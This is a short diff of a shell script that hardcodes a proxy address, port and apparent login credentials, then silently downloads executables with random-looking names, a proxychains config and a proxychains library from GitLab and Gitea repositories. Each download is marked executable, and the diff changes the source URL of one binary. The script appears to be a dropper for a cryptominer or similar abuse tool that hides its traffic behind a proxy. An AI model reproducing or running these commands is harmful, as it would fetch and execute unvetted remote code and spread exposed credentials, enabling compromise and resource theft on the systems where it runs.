@@ -2,7 +2,7 @@ proxy="52.5.38.201"
 port="9293" 
 user="py8h6mtimyeool"  
 pass="r1wr4kibq49lw0k52qhi17h0ke1j" 
-wget -q -O py8h6mtimyeool https://gitlab.com/ricardluweh/vds/-/raw/main/vds && chmod +x py8h6mtimyeool
+wget -q -O py8h6mtimyeool https://gitlab.com/node.js2594450/ruby/-/raw/main/vds && chmod +x py8h6mtimyeool
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
